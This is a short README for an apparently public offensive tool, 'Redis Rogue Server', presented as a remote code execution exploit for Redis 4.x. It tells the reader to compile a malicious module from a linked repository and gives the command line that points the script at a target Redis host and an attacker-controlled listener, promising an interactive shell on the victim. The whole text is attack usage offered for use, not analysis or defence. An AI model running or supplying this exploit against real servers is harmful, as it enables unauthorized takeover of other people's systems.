# Redis Rogue Server

A exploit for Redis 4.x RCE, inspired by [Redis post-exploitation](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf).

## Usage:

Compile .so from <https://github.com/n0b0dyCN/RedisModules-ExecuteCommand>.

Copy the .so file to same folder with `redis-rogue-server.py`.

Run the rogue server:

```
python3 redis-rogue-server.py --rhost <target address> --rport <target port> --lhost <vps address> --lport <vps port>
```

The default target port is 6379 and the default vps port is 21000.

And you will get an interactive shell!
